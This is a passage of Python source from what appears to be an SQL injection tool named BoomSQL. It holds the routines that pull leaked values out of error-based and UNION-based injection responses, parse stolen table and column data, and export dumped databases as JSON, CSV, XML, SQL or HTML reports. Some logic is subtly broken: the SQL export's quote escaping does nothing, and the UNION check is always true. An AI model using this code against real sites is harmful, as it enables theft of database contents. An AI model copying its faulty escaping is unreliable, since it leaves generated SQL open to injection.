        # 1. ExtractValue error patterns
        extract_patterns = [
            r'XPATH syntax error.*?~([^~]+)~',  # ExtractValue error with data
            r'~([^~]+)~',                       # Simple tilde-wrapped data
        ]
        
        for pattern in extract_patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
        
        # 2. UpdateXML error patterns  
        updatexml_patterns = [
            r'XPATH syntax error.*?\'([^\']+)\'',  # UpdateXML error
            r'Invalid XML.*?\'([^\']+)\''          # XML parsing error
        ]
        
        for pattern in updatexml_patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
        
        # 3. Duplicate entry errors (for group by injection)
        duplicate_patterns = [
            r'Duplicate entry \'([^\']+)\' for key',
            r'Duplicate key \'([^\']+)\''
        ]
        
        for pattern in duplicate_patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
        
        # 4. CAST/conversion errors (MSSQL)
        cast_patterns = [
            r'Conversion failed when converting.*?\'([^\']+)\'',
            r'Invalid column name \'([^\']+)\''
        ]
        
        for pattern in cast_patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
        
        # 5. Union-based data extraction (look for visible data in specific contexts)
        # For UNION-based injection, look for injected data anywhere in the response
        if "UNION" in str(self.vulnerability.injection_point.payload) or any("UNION" in tech for tech in [
            "1' UNION SELECT", "1 UNION SELECT"
        ]):
            # Remove HTML tags and look for meaningful data
            import re
            # Remove HTML tags
            clean_content = re.sub(r'<[^>]+>', ' ', content)
            # Look for patterns that might be database results
            lines = clean_content.split('\n')
            for line in lines:
                line = line.strip()
                # Look for lines that might contain database results
                # Skip common web content and focus on potential data
                if (line and 
                    len(line) > 3 and 
                    len(line) < 100 and  # Reasonable length for database data
                    not any(word in line.lower() for word in [
                        'home', 'about', 'contact', 'privacy', 'terms', 'login', 
                        'register', 'search', 'menu', 'navigation', 'copyright',
                        'all rights reserved', 'powered by', 'website', 'page',
                        'click', 'here', 'more', 'read', 'view', 'see', 'get',
                        'javascript', 'css', 'html', 'http', 'www', '.com', '.org'
                    ]) and
                    # Look for version numbers or database-like content
                    (re.search(r'\d+\.\d+', line) or  # Version numbers
                     re.search(r'[a-zA-Z]+_[a-zA-Z]+', line) or  # Database naming
                     re.search(r'^[a-zA-Z0-9_-]+$', line) or  # Simple identifiers
                     len(line.split()) == 1)  # Single words/values
                ):
                    return line.strip()
        
            # Also look for injected data in common HTML contexts
            union_patterns = [
                r'<td>([^<]+)</td>',     # Table cells
                r'<p>([^<]+)</p>',       # Paragraphs  
                r'<div>([^<]+)</div>',   # Divs
                r'<span>([^<]+)</span>', # Spans
                r'<li>([^<]+)</li>',     # List items
                r'>([^<]{1,50})<',       # Any content between tags
            ]
            
            for pattern in union_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    # Filter out common website text
                    if (match.strip() and 
                        len(match.strip()) > 1 and
                        len(match.strip()) < 100 and
                        not any(word in match.lower() for word in [
                            'the', 'and', 'for', 'with', 'this', 'that', 'home', 
                            'about', 'contact', 'menu', 'search', 'login', 'click',
                            'here', 'more', 'read', 'view', 'see', 'page', 'website'
                        ]) and
                        # Look for database-like content
                        (re.search(r'\d+\.\d+', match) or  # Version numbers
                         re.search(r'[a-zA-Z]+_[a-zA-Z]+', match) or  # Database naming
                         re.search(r'^[a-zA-Z0-9_-]+$', match.strip()))  # Simple identifiers
                    ):
                        return match.strip()
        
        # 6. Generic error information extraction
        error_patterns = [
            r'MySQL server version.*?\'([^\']+)\'',
            r'You have an error in your SQL syntax.*near \'([^\']+)\'',
        ]
        
        for pattern in error_patterns:
            match = re.search(pattern, content, re.IGNORECASE | re.DOTALL)
            if match:
                # For syntax errors, we might get useful info
                error_text = match.group(1).strip()
                if len(error_text) > 0 and error_text != "''":
                    return error_text
        
        return None
        
    def parse_query_result(self, result: str) -> List[str]:
        """Parse query result into list of values"""
        if not result:
            return []
            
        # Simple parsing - in practice, this would be more sophisticated
        lines = result.strip().split('\n')
        return [line.strip() for line in lines if line.strip()]
        
    def parse_column_info(self, result: str, db_type: DatabaseType) -> List[ColumnInfo]:
        """Parse column information result"""
        columns = []
        
        if not result:
            return columns
            
        lines = result.strip().split('\n')
        for line in lines:
            if not line.strip():
                continue
                
            # Parse based on database type
            if db_type == DatabaseType.MYSQL:
                # Expected format: column_name, data_type, is_nullable, column_default, character_maximum_length
                parts = line.split(',')
                if len(parts) >= 2:
                    columns.append(ColumnInfo(
                        name=parts[0].strip(),
                        type=parts[1].strip(),
                        length=int(parts[4].strip()) if len(parts) > 4 and parts[4].strip().isdigit() else 0,
                        nullable=parts[2].strip().lower() == 'yes' if len(parts) > 2 else True,
                        default=parts[3].strip() if len(parts) > 3 else ""
                    ))
            else:
                # Generic parsing
                parts = line.split(',')
                if len(parts) >= 2:
                    columns.append(ColumnInfo(
                        name=parts[0].strip(),
                        type=parts[1].strip(),
                        length=0,
                        nullable=True
                    ))
                    
        return columns
        
    def parse_data_result(self, result: str, column_names: List[str]) -> List[Dict[str, Any]]:
        """Parse data result into list of dictionaries"""
        rows = []
        
        if not result:
            return rows
            
        # For error-based extraction, we typically get single values
        # Clean up the result
        cleaned_result = result.strip()
        
        # Remove HTML tags if present
        cleaned_result = re.sub(r'<[^>]+>', '', cleaned_result)
        
        # Create a single row with the extracted data
        if cleaned_result and column_names:
            row = {}
            # Put the extracted data in the first column
            row[column_names[0]] = cleaned_result
            # Fill other columns with empty values  
            for col_name in column_names[1:]:
                row[col_name] = ""
            rows.append(row)
                
        return rows
        
    def parse_batch_data(self, result: str, column_names: List[str]) -> List[Dict[str, Any]]:
        """Parse batch data result from GROUP_CONCAT queries"""
        rows = []
        
        if not result:
            return rows
            
        # Clean up the result
        cleaned_result = result.strip()
        
        # Remove HTML tags if present
        cleaned_result = re.sub(r'<[^>]+>', '', cleaned_result)
        
        # Split by row separator (||)
        row_data = cleaned_result.split('||')
        
        for row_str in row_data:
            if not row_str.strip():
                continue
                
            # Split by column separator (|)
            col_values = row_str.split('|')
            
            # Create row dict
            row = {}
            for i, col_name in enumerate(column_names):
                if i < len(col_values):
                    row[col_name] = col_values[i].strip()
                else:
                    row[col_name] = ""
            
            rows.append(row)
                
        return rows
        
    def parse_simple_data(self, result: str, column_names: List[str]) -> List[Dict[str, Any]]:
        """Parse simple data result (single column or basic extraction)"""
        rows = []
        
        if not result:
            return rows
            
        # Clean up the result
        cleaned_result = result.strip()
        
        # Remove HTML tags if present
        cleaned_result = re.sub(r'<[^>]+>', '', cleaned_result)
        
        # Split by common separators
        values = []
        if '|' in cleaned_result:
            values = cleaned_result.split('|')
        elif ',' in cleaned_result:
            values = cleaned_result.split(',')
        elif '\n' in cleaned_result:
            values = cleaned_result.split('\n')
        else:
            values = [cleaned_result]
        
        for value in values:
            value = value.strip()
            if not value:
                continue
                
            # Create row dict
            row = {}
            row[column_names[0]] = value
            
            # Fill other columns with empty values
            for col_name in column_names[1:]:
                row[col_name] = ""
            
            rows.append(row)
                
        return rows
        
    def cancel_dump(self):
        """Cancel the current dump operation"""
        self.cancel_requested = True
        self.log_info("Dump cancellation requested")
        
    def export_data(self, database_info: DatabaseInfo, format: ExportFormat, output_file: str):
        """Export database data to file"""
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        if format == ExportFormat.JSON:
            self.export_json(database_info, output_path)
        elif format == ExportFormat.CSV:
            self.export_csv(database_info, output_path)
        elif format == ExportFormat.XML:
            self.export_xml(database_info, output_path)
        elif format == ExportFormat.SQL:
            self.export_sql(database_info, output_path)
        elif format == ExportFormat.HTML:
            self.export_html(database_info, output_path)
            
        self.log_info(f"Data exported to {output_path}")
        
    def export_json(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to JSON format"""
        data = {
            "database_info": {
                "name": database_info.name,
                "version": database_info.version,
                "user": database_info.user,
                "hostname": database_info.hostname
            },
            "tables": []
        }
        
        for table in database_info.tables:
            table_data = {
                "name": table.name,
                "schema": table.schema,
                "row_count": table.row_count,
                "columns": [
                    {
                        "name": col.name,
                        "type": col.type,
                        "length": col.length,
                        "nullable": col.nullable,
                        "default": col.default,
                        "primary_key": col.primary_key
                    }
                    for col in table.columns
                ],
                "data": table.data
            }
            data["tables"].append(table_data)
            
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
            
    def export_csv(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to CSV format"""
        # Create a CSV file for each table
        for table in database_info.tables:
            table_file = output_path.parent / f"{output_path.stem}_{table.schema}_{table.name}.csv"
            
            if table.data:
                with open(table_file, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=table.data[0].keys())
                    writer.writeheader()
                    writer.writerows(table.data)
                    
    def export_xml(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to XML format"""
        root = ET.Element("database")
        
        # Database info
        info_elem = ET.SubElement(root, "info")
        ET.SubElement(info_elem, "name").text = database_info.name
        ET.SubElement(info_elem, "version").text = database_info.version
        ET.SubElement(info_elem, "user").text = database_info.user
        ET.SubElement(info_elem, "hostname").text = database_info.hostname
        
        # Tables
        tables_elem = ET.SubElement(root, "tables")
        for table in database_info.tables:
            table_elem = ET.SubElement(tables_elem, "table")
            table_elem.set("name", table.name)
            table_elem.set("schema", table.schema)
            table_elem.set("row_count", str(table.row_count))
            
            # Columns
            columns_elem = ET.SubElement(table_elem, "columns")
            for col in table.columns:
                col_elem = ET.SubElement(columns_elem, "column")
                col_elem.set("name", col.name)
                col_elem.set("type", col.type)
                col_elem.set("length", str(col.length))
                col_elem.set("nullable", str(col.nullable))
                col_elem.set("default", col.default)
                col_elem.set("primary_key", str(col.primary_key))
                
            # Data
            data_elem = ET.SubElement(table_elem, "data")
            for row in table.data:
                row_elem = ET.SubElement(data_elem, "row")
                for col_name, value in row.items():
                    col_elem = ET.SubElement(row_elem, "column")
                    col_elem.set("name", col_name)
                    col_elem.text = str(value)
                    
        # Write to file
        tree = ET.ElementTree(root)
        tree.write(output_path, encoding='utf-8', xml_declaration=True)
        
    def export_sql(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to SQL format"""
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(f"-- Database dump generated by BoomSQL\n")
            f.write(f"-- Database: {database_info.name}\n")
            f.write(f"-- Version: {database_info.version}\n")
            f.write(f"-- User: {database_info.user}\n")
            f.write(f"-- Hostname: {database_info.hostname}\n")
            f.write(f"-- Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            for table in database_info.tables:
                # Create table statement
                f.write(f"-- Table: {table.schema}.{table.name}\n")
                f.write(f"DROP TABLE IF EXISTS `{table.name}`;\n")
                f.write(f"CREATE TABLE `{table.name}` (\n")
                
                col_definitions = []
                for col in table.columns:
                    col_def = f"  `{col.name}` {col.type}"
                    if col.length > 0:
                        col_def += f"({col.length})"
                    if not col.nullable:
                        col_def += " NOT NULL"
                    if col.default:
                        col_def += f" DEFAULT '{col.default}'"
                    if col.primary_key:
                        col_def += " PRIMARY KEY"
                    col_definitions.append(col_def)
                    
                f.write(",\n".join(col_definitions))
                f.write("\n);\n\n")
                
                # Insert data
                if table.data:
                    f.write(f"-- Data for table: {table.name}\n")
                    for row in table.data:
                        values = []
                        for col in table.columns:
                            value = row.get(col.name, "")
                            if value is None:
                                values.append("NULL")
                            else:
                                escaped_value = str(value).replace("'", "\'")
                                values.append(f"'{escaped_value}'")
                        f.write(f"INSERT INTO `{table.name}` VALUES ({', '.join(values)});\n")
                    f.write("\n")
                    
    def export_html(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to HTML format"""
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
    <title>Database Dump - BoomSQL</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #f0f0f0; padding: 10px; border-radius: 5px; }
        .table { margin: 20px 0; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .table-info { background-color: #e9f5ff; padding: 10px; margin: 10px 0; }
    </style>
</head>
<body>
""")
            
            # Database info
            f.write(f"""
    <div class="header">
        <h1>Database Dump Report</h1>
        <p><strong>Database:</strong> {html.escape(database_info.name)}</p>
        <p><strong>Version:</strong> {html.escape(database_info.version)}</p>
        <p><strong>User:</strong> {html.escape(database_info.user)}</p>
        <p><strong>Hostname:</strong> {html.escape(database_info.hostname)}</p>
        <p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
""")
            
            # Tables
            for table in database_info.tables:
                f.write(f"""
    <div class="table">
        <h2>Table: {html.escape(table.schema)}.{html.escape(table.name)}</h2>
        <div class="table-info">
            <p><strong>Row Count:</strong> {table.row_count}</p>
            <p><strong>Columns:</strong> {len(table.columns)}</p>
        </div>
        
        <h3>Structure</h3>
        <table>
            <tr>
                <th>Column</th>
                <th>Type</th>
                <th>Length</th>
                <th>Nullable</th>
                <th>Default</th>
                <th>Primary Key</th>
            </tr>
""")
                
                for col in table.columns:
                    f.write(f"""
            <tr>
                <td>{html.escape(col.name)}</td>
                <td>{html.escape(col.type)}</td>
                <td>{col.length}</td>
                <td>{'Yes' if col.nullable else 'No'}</td>
                <td>{html.escape(col.default)}</td>
                <td>{'Yes' if col.primary_key else 'No'}</td>
            </tr>
""")
                
                f.write("        </table>\n")
                
                # Data
                if table.data:
                    f.write(f"""
        <h3>Data (First 100 rows)</h3>
        <table>
            <tr>
""")
                    for col in table.columns:
                        f.write(f"                <th>{html.escape(col.name)}</th>\n")
                    f.write("            </tr>\n")
                    
                    for row in table.data[:100]:  # Limit to first 100 rows
                        f.write("            <tr>\n")
                        for col in table.columns:
                            value = row.get(col.name, "")
                            f.write(f"                <td>{html.escape(str(value))}</td>\n")
                        f.write("            </tr>\n")
                    
                    f.write("        </table>\n")
                    
                f.write("    </div>\n")
                
            f.write("""
</body>
</html>
""")
            
    def get_progress(self) -> Optional[DumpProgress]:
        """Get current dump progress"""
        return self.progress
    
    def log_debug(self, message: str):
        """Log debug message"""
        if hasattr(self, '_logger') and self._logger:
            self._logger.debug(message)
            
    def log_warning(self, message: str):
        """Log warning message"""
        if hasattr(self, '_logger') and self._logger:
            self._logger.warning(message)
        else:
            print(f"WARNING: {message}")